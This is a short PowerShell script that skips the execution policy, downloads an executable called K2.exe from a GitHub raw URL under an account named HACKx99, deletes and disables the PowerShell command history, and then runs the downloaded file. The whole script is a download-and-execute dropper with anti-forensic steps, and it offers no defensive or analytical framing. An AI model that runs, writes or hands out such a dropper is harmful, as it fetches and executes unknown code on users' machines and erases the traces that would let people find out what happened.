# PowerShell Script to Download, Run EXE in PS Console, Clear History, and Auto-Close
try {
    # Bypass execution policy
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Define URL and history path
    $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
    $tempPath = "C:\Windows\Temp\K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    # Download EXE
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing

    if (Test-Path $tempPath) {
        # Clear PowerShell history
        Clear-History -ErrorAction SilentlyContinue
        if (Test-Path $historyPath) {
            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        }
        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
        
        # Run EXE within PowerShell console (no new window)
        & $tempPath
    }

} catch {
    Write-Error "Error: $($_.Exception.Message)"
}
